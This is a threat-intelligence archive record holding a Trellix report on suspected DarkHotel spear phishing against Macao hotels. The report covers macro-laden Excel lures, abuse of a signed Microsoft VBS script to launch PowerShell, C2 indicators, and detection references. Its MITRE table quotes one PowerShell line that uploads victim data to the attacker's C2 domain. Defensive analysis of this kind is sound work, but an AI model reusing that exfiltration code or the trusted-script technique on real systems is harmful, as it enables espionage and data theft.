{
    "id": "41f3c471-a212-4c81-9d43-ce71f8b5356a",
    "created_at": "2023-01-12T15:09:38.608328Z",
    "updated_at": "2025-03-27T02:15:41.640344Z",
    "deleted_at": null,
    "sha1_hash": "ca4ee6705b2319937df2cf8c2e0572ae0e804f99",
    "title": "2022-03-17 - Suspected DarkHotel APT activity update",
    "authors": "",
    "file_creation_date": "2022-05-28T19:24:27Z",
    "file_modification_date": "2022-05-28T19:24:27Z",
    "file_size": 1585018,
    "plain_text": "# Suspected DarkHotel APT activity update\n\n**[trellix.com/en-us/about/newsroom/stories/threat-labs/suspected-darkhotel-apt-activity-update.html](https://www.trellix.com/en-us/about/newsroom/stories/threat-labs/suspected-darkhotel-apt-activity-update.html)**\n\n_One Hotel to rule them all, One Hotel to find them, One Hotel to bring them all and in the_\n_darkness bind them._\n\n[By Thibault Seret and John Fokker · March 17, 2022](https://www.trellix.com/en-us/about/newsroom/stories/contributors/john-fokker.html)\n\n## Introduction:\n\nOur advanced threat research team has discovered a first-stage malicious campaign\ntargeting luxury hotels in Macao, China since the latter half of November 2021. The attack\nstarted with a spear phishing email directed to the hotel’s management staff in roles like the\nvice president of HR, assistant manager and front office manager. Based on the job titles we\ncan assume that the targeted individuals have sufficient access into the hotel’s network,\nincluding the booking systems. The email used for this spear phishing attack contains an\nattachment with an Excel sheet. This Excel sheet is used to trick the victim and enable\nmalicious macros embedded when it’s opened. Those macros enable several mechanisms\ndetailed in the Technical Analysis part and summarized in the Infection Flow Chart below.\nFirstly, macros create a scheduled task to perform recognition, data listing and data\nexfiltration. Then, to enable communication with the Command-and-Control server used to\nexfiltrate victim data, macros are using a known lolbas (Living Off the Land Binaries and\nScripts) technique to perform PowerShell command lines as trusted script:\n\n\n-----\n\n**Figure 1 Execution flow of the attack**\n\nAn external report written in late December 2021 by the Zscaler’s research team talked\nabout APT DarkHotel activity with a detailed analysis of a new attack chain. In this paper, IP\nrelated to the C2 infrastructure used for system information exfiltration mentioned:”\n23.111.184[.]119”. Once exposed, we often see threat actors move their operation to different\ninfrastructure or halt their operations for some time. However, in this case neither happened\nand the IP has been used by the actor continuously even after we finished our initial\nresearch.\n\nThis IP was used by the actor to drop new payloads as first stages to set up the victim\nenvironment for system information exfiltration and potential next steps. Those payloads\nwere used to target major hotel chains in Macao, including the Grand Coloane Resort and\nWynn Palace.\n\nTrellix’s customers are protected from this threat thanks to our technologies. Generic\nsignatures names have been attributed: “RDN/Generic Downloader.x”\" and\n“BehavesLike.OLE2.Downloader.cg\".\n\n## DarkHotel Background:\n\nDarkHotel, a suspected South Korean advanced persistent threat (APT) group, is known for\ntargeting law enforcement, pharmaceuticals and automotive manufacturers, along with other\nindustries. The group got their name by targeting hotels and business hotel visitors through\nspear phishing campaigns with malicious code to steal sensitive data from top executives\nlike CEOs and sales leaders while staying in luxury hotels.\n\n## Attribution:\n\n\n-----\n\nWe attribute this campaign to the DarkHotel with a moderate level of confidence. In our\nresearch we came across the following pieces of evidence that supports the possible\nDarkHotel attribution:\n\nThe IP mentioned has been attributed to DarkHotel C2 activity by the cybersecurity\ncommunity\nThe targeted sector and the country fit within the DarkHotel target profile\nThe Command-and-Control panel presents known development patterns attributed to\nDarkHotel APT\n\nHowever, we have lowered our confidence level to moderate because the specific IP address\nremained active for quite some time even after being publicly exposed and the same IPaddress is the origin of other malicious content not related to this specific threat. These two\nobservations have made us more cautious in our attribution.\n\n## Campaign Analysis:\n\nWe will detail the suspected DarkHotel technical behavior in this specific campaign.\n\nOn Tuesday, December 7, 2021, an email was sent to seventeen different hotels in the\nMacao area from the “Macao Government Tourism Office” with an attachment to the email an\nExcel file named “信息.xls” (information.xls). We were able to identify the seventeen hotels\nby examining the mail headers of the phishing mail.\n\n**Figure 2 Email header**\n\n**with attacker email used**\n\n**Figure 3 Email metadata related to the Excel attachment**\n\nIn another email related to this campaign, the actor is luring the hotel’s staff victim by asking\nthem to complete the Excel file to specify which people were staying at the hotel and with the\nsubject “passenger inquiry”:\n\n_Dear Sir/Madam,_\n\n_Please open the attached file with enable content and specify whether the people were_\n_staying at the hotel or not?_\n\n\n-----\n\n_Yours faithfully,_\n_Inspection Division - MGTO_\n\n**Figure 4 Email body used to target the victims**\n\n## Technical Analysis:\n\n**Name** 信息.xls (Information.xls)\n\n\nSha256\nhash\n\n\na251ac8cec78ac4f39fc5536996bed66c3436f8c16d377922187ea61722c71f8\n\n\nBy looking the code related to the Excel file, we can determine which operational system and\nOffice version have been used to generate it. The “DocumentSummaryInformation” stream\nprovides information regarding the Office version used. In this case, the version is “983040”\nwhich is related to Excel 2013.\n\n**Figure 5 Olemeta output**\n\nThen by looking for the 4-byte PropertySetSystemIdentifier in both\n“DocumentSummaryInformation” or “Summaryinformation” streams, we can define which OS\nwas used to create the Excel file:\n\n**Figure**\n\n**6 “DocumentSummaryInformation” hex view**\n\nWe can assume the actor used Windows 8 to create this Excel file, because the 4-byte\nPropertySetSystemIdentifier indicate the Major and minor version OS, and here Windows\n0x06 0x02 = Windows 8.\n\nThe Excel file was password protected with the default password “VelvetSweatshop”. After\ndecryption, the Excel file displays some decoy information to interest the victim:\n\n\n-----\n\n**Figure 7 Excel sheet unprotected**\nThe file embedded macros are triggered when the file is open. Those macros have several\nmechanisms that we will detail:\n\n**Figure 8 Directory entries and used streams + storages**\n\nMalicious macros are stored into “Module1.bas” stream.\n\n\n-----\n\n**Figure 9 Embedded mechanisms related to macros**\n\nThe macros are obfuscated to make the analysis more complex and create a ton of loops to\ndecode strings, orders, etc. to prepare the victim environment for sending information to the\nC2:\n\n**Figure 10 Obfuscated macro**\nAs a loop example, one function is dedicated to creating a COM object that loads the Task\nScheduler Service by implementing “Schedule.Service” to schedule a task:\n\n\n-----\n\n**Figure 11 COM Object resolution + creation**\n\nBy using this mechanism, privileged users can schedule a task on the host without using the\n“schtasks.exe” binary.\n\nHere are the different schedule task’s settings associated:\n\n   - Connect\n\n    - GetFolder\n\n   - NewTask\n\n    - Settings\n\n   - StartWhenAvailable\n\n   - RunOnlyIfNetworkAvailable\n\n   - StopIfGoingOnBatteries\n\n    - DisallowStartIfOnBatteries\n\nFunctions summary:\n\n    - Drop VBS script in\n“C:\\\\Users\\USER\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\”\n\n   - Launch wscript with associated arguments\n\n   - Launch PowerShell with associated command lines\n\n\n-----\n\n    - Delete created files\n\n    - Check for “Syncappvpublishingserver.vbs” in “\\Sytem32”.\n\nThe “wscript.exe” binary is used to execute the script dropped earlier in\n“C:\\\\Users\\USER\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\” named “prcjobs.vbs” in addition\nto a first PowerShell command line used as an argument, run as:\n“wscript.exe /b /nologo \"C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\prcjobs.vbs\"\n\"powershell -c”\n\n**Fig12: PowerShell command lines**\nThis script is used to set many things. First, it creates many temporary environment variables\nto allocate space and obtain the computer name and RMOT indicator to indicate to the hardcoded C2 the victim's name. Then, it crafts a stream to exfiltrate this data and connect it to\nthe C2 “fsm-gov.com”. Then there is a function that, we assume, is checking if the host is\nalready compromised by looking for the “sc” string as an environment previously set for the\n“RMOT” indicator. If the host is compromised, the script will delete files related to the attack.\n\nAnother Excel file sample used by the group with more PowerShell mechanisms with the\nsame configuration (C2 connection, macros, etc) has been spotted around the same period.\nWe assume the previous sample was the first try from the actor, and this one is the next\nversion:\n\n**Name** 信息.xls\n\n\n-----\n\nSha256\nhash\n\n\n163c386598e1826b0d81a93d2ca0dc615265473b66d4521c359991828b725c14\n\n\nIn this case, as previously mentioned, macros and C2 configuration (environment variables,\nstream crafting, etc.) are the same. Also, metadata are the same as with the previous Excel\nsheet (operational system and office version used). This means we can assume those Excel\nsheets have been created on the same machine or at least, by the same group.\n\nThe main difference with the previous sample lies in the PowerShell mechanisms.\n\nDuring the macro’s decryption, we mentioned that the file was looking for\n“SyncappvpublishingServer.vbs” into “\\System32”. The reason is requesting this file with\n“wscript.exe” in addition to PowerShell command lines as arguments allow the current user\nto execute a script signed by Microsoft. So basically, trusted and not blocked on the host\nmachine.\n\nThe first step is calling “SyncappvpublishingServer.vbs” throw “wscript.exe” and pass as\narguments the command lines you’d like to use:\n\n**Fig13: Query for “SyncappvpublishingServer.vbs”**\nAs you can see, the script is pretty like the previous sample we described earlier. Same\nmechanisms but called in another way. Then the PowerShell script decoyed as a trusted\nscript:\n\n\n-----\n\n**Fig14: PowerShell command lines used right after “SyncappvpublishingServer.vbs” to**\n**be executed as a trusted script**\n\nThe Command-and-Control server URL “https://fsm-gov.com” is hard-coded and clearly\nvisible in the code. The objective of the script is the same as the previous script.\n\n## Command-and-Control Examination:\n\nThe Command-and-Control server, hxxps://fsm-gov(.)com, used to spread this campaign\nwas trying to impersonate a legitimate government website domain for the Federated States\nof Micronesia. However, the real Micronesia website domain is “fsmgov.org”:\n\n\n-----\n\n**Figure 15 Micronesia government website**\n\nThe domain used by the C2 is “fsm-gov.com”:\n\n**Figure 16 C2 impersonating Micronesia government website**\n\nLooks like the IP is owned by Hivelocity and hosted on “hosterbox.com” who provides shared\nVPS, this could explain the abundance of unknown other malicious activity. We tried to reach\nout Hivelocity to get more details for this machine, but they weren’t willing to collaborate.\n\nThe backend is quite similar as previously reported Command-and-Control related to\nDarkHotel.\n\nBy examining the specific C2 server we were able to determine that the threat actors chose\nto use Mailman to spread the emails to their targets.\n\n\n-----\n\n**Figure 17 Mailman listinfo page**\n\n## Campaign Objectives:\n\nBased on targeting, we suspect the group was trying to lay the foundation for a future\ncampaign involving these specific hotels. After researching the event agenda for the targeted\nhotels, we did indeed find multiple conferences that would have been of interest to the threat\nactor. For Instance, one hotel was hosting an International Environment Forum and an\nInternational Trade & Investment Fair, both of which would attract potential espionage\ntargets.\n\nBut even threat actors will get unlucky. Due to the rapid rise of COVID-19 in Macao and in\nChina in general, most of events were canceled or postponed. This could explain why the\nactor stopped spreading their malicious payload after the 18th of January.\n\n## Government Alerts:\n\nThankfully, the Macao Security Force Bureau became aware of the campaign in December\n2021:\n\n\n-----\n\n**Figure**\n\n**18 Macao Security Force Bureau announcement**\n\nThe Macao Security Forces Bureau (MSSB) has received a notification from the Cyber\nSecurity Incident Alert and Emergency Response Center of the Police Department that a\nweb domain name (fsm- gov.com) with a highly similar name to the official web page of the\nMacao Security Forces has been discovered, and it is suspected that unlawful elements are\nusing email to send fraudulent emails to commit illegal acts. The Macao Security Forces\nAffairs Bureau and the Administration have immediately followed up on the situation.\n\nThe Macao Security Forces Affairs Bureau would like to urge and remind the public to be\nvigilant when browsing the Internet and not to access suspicious links or send any personal\ninformation to suspicious websites or emails. If you have any suspicion, please call the\ncomplaints and enquiries hotline of the Macao Security Forces Bureau at 87997777 to verify\nthe situation to prevent being deceived. Alternatively, you may call the Judicial Police Fraud\nEnquiry Hotline at 8800 7777 or the Crime Reporting Hotline at 993 for assistance.\n\n## Other Criminal activity related to the C2 IP:\n\nEarlier in our report we mentioned that we observed not only the campaign targeting a hotel\nchain originating from the specific IP but also other malicious activity. One of these\ncampaigns was targeting MetaMask crypto users and presenting them with a Collab.Land\n\n\n-----\n\nphishing page:\n\n**Figure 19 MetaMask phishing page**\n\nA quick glance at the source of the webpage confirmed our suspicions; MetaMask users\nwere prompted to fill in their credentials which were then sent to a Discord server used for\ncredential harvesting.\n\n**Figure 20 The export information function to Discord server on the webpage source**\n\nGiven the difference in threat actor TTPs, we believe with a high level of confidence that this\nphishing campaign is not related to the suspected DarkHotel campaign described in this\nblog. The association of this IP with a large amount of malicious activity would have put this\nIP on all of the major block lists, essentially limiting their ability to infect their targets right\nfrom the start. This unwanted attention does not speak in favor of a cyber espionage\ncampaign and is why we adjusted our confidence level for an APT attack to moderate.\n\n## Conclusion:\n\n\n-----\n\nRegardless of the exact threat actor attribution, this campaign demonstrates that the\nhospitality sector is indeed a valid target for espionage operations. Executives should be\naware that the (cyber) security of their respective organizations doesn’t stop at the edge of\ntheir network. In the past, there have seen multiple examples where knowing who was\nstaying where and attending which conference was an essential step in a threat actor\ntargeting process, which either led to a digital or in-person follow up. In this campaign, the\nCOVID-19 restrictions threw a wrench in the threat actor’s engine, but that doesn’t mean\nthey have abandoned this approach.\n\nTherefore, we advise travelers to use their security due diligence when travelling from hotel\nto hotel. Only bring the essential devices with limited data, keep security systems up to date\nand make use of a VPN service when using hotel Wi-Fi.\n\n## MITRE ATT&CK:\n\n\n**Technique ID**\n\nSpearphishing\nattachment\n\n\n**Technique**\n**Description** **Observable** **IOC**\n\nT1566.001 Send\nmalicious\nExcel file\nthrow email\n\n\nMalicious File T1204.002 Malicious\nExcel file\n\nVisual Basic T1059.005 Excel file\nMacros\n\nFile Deletion T1070.004 Delete files\nafter\nprocess\nexecution\n\nNative API T1106 Use of\nWindows\nnative APIs\n\n\nQuery\nRegistry\n\nScheduled\nTask\n\n\nT1012 Query\nregistry\nvalues\n\nT1053 Schedule a\ntask for the\n“wscript.exe”\nprocess\n\n\n-----\n\nScripting T1064 Excel File\nMacros,\nPowerShell\nscripts, VBS\nscripts\n\n\nStandard\nApplication\nLayer\nProtocol\n\nCommand\nand Scripting\nInterpreter:\nPowerShell\n\n\nT1071 Connect to\n“fsmgov.com”\nwith\nPowerShell\n\nT1059.001 PowerShell\ncommand\nlines\n\n\n$wc.uploadstring('https: //fsm-gov.com'\n,'post',(('--'+$bu), ('Content-Disposition:\nform-data; Name='+$dq+'Sync'+$dq+';\nfileName='+$dq+'Sync'+$dq+$lf),$rs,('-'+$bu+'--'+$lf) -join $lf))\n\n\n## Detection mechanisms:\n\nSigma Rules:\n\n-Too Long PowerShell Commandlines:\nhttps://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/rul\nes/wi\nndows/process_creation/sysmon_long_powershell_commandline.yml\n\n-Windows Suspicious Use Of Web Request in CommandLine:\nhttps://github.com/SigmaHQ/sigma/blob/eb382c4a59b6d87e186ee269805fe2db2acf250e/rul\nes/wi\nndows/process_creation/process_creation_susp_web_request_cmd.yml\n\n- Stop Windows Service:\nhttps://github.com/SigmaHQ/sigma/blob/69be18d343db717b6fcac9e0b52aea9a8908701d/rul\nes/wi\nndows/process_creation/win_service_stop.yml\n\n- Suspicious PowerShell Invocation Based on Parent Process:\nhttps://github.com/SigmaHQ/sigma/blob/69be18d343db717b6fcac9e0b52aea9a8908701d/rul\nes/wi\nndows/process_creation/win_service_stop.yml\n\n- Net.exe Execution:\nhttps://github.com/SigmaHQ/sigma/blob/69be18d343db717b6fcac9e0b52aea9a8908701d/rul\nes/wi\n\n\n-----\n\nndows/process_creation/win_service_stop.yml\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-17 - Suspected DarkHotel APT activity update.pdf"
    ],
    "report_names": [
        "2022-03-17 - Suspected DarkHotel APT activity update.pdf"
    ],
    "threat_actors": [
        {
            "id": "1dadf04e-d725-426f-9f6c-08c5be7da159",
            "created_at": "2022-10-25T15:50:23.624538Z",
            "updated_at": "2025-03-27T02:00:55.508759Z",
            "deleted_at": null,
            "main_name": "Darkhotel",
            "aliases": [
                "Darkhotel",
                "DUBNIUM",
                "Zigzag Hail"
            ],
            "source_name": "MITRE:Darkhotel",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b13c19d6-247d-47ba-86ba-15a94accc179",
            "created_at": "2024-05-01T02:03:08.149923Z",
            "updated_at": "2025-03-27T02:05:17.422065Z",
            "deleted_at": null,
            "main_name": "TUNGSTEN BRIDGE",
            "aliases": [
                "DUBNIUM ",
                "DarkHotel ",
                "CTG-1948 "
            ],
            "source_name": "Secureworks:TUNGSTEN BRIDGE",
            "tools": [
                "Nemim"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2b4eec94-7672-4bee-acb2-b857d0d26d12",
            "created_at": "2023-01-06T13:46:38.272109Z",
            "updated_at": "2025-03-27T02:00:02.790029Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "DUBNIUM",
                "Fallout Team",
                "Luder",
                "Tapaoux",
                "Shadow Crane",
                "APT-C-06",
                "SIG25",
                "Karba",
                "Nemim",
                "Nemin",
                "G0012",
                "ATK52",
                "T-APT-02",
                "TUNGSTEN BRIDGE",
                "Zigzag Hail"
            ],
            "source_name": "MISPGALAXY:DarkHotel",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
            "created_at": "2022-10-25T16:07:23.528994Z",
            "updated_at": "2025-03-27T02:02:09.847683Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "APT-C-06",
                "ATK 52",
                "CTG-1948",
                "Dubnium",
                "Fallout Team",
                "Higaisa",
                "Luder",
                "Operation DarkHotel",
                "Operation Daybreak",
                "Operation Inexsmar",
                "Operation PowerFall",
                "Operation The Gh0st Remains the Same",
                "SIG25",
                "Shadow Crane",
                "T-APT-02",
                "Tungsten Bridge",
                "Zigzag Hail"
            ],
            "source_name": "ETDA:DarkHotel",
            "tools": [
                "Asruex",
                "DarkHotel",
                "DmaUp3.exe",
                "GreezeBackdoor",
                "Karba",
                "Nemain",
                "Nemim",
                "Ramsay",
                "Retro",
                "Tapaoux",
                "Trojan.Win32.Karba.e",
                "Virus.Win32.Pioneer.dx",
                "igfxext.exe",
                "msieckc.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536178,
    "ts_updated_at": 1743041741,
    "ts_creation_date": 1653765867,
    "ts_modification_date": 1653765867,
    "files": {
        "pdf": "https://archive.orkl.eu/ca4ee6705b2319937df2cf8c2e0572ae0e804f99.pdf",
        "text": "https://archive.orkl.eu/ca4ee6705b2319937df2cf8c2e0572ae0e804f99.txt",
        "img": "https://archive.orkl.eu/ca4ee6705b2319937df2cf8c2e0572ae0e804f99.jpg"
    }
}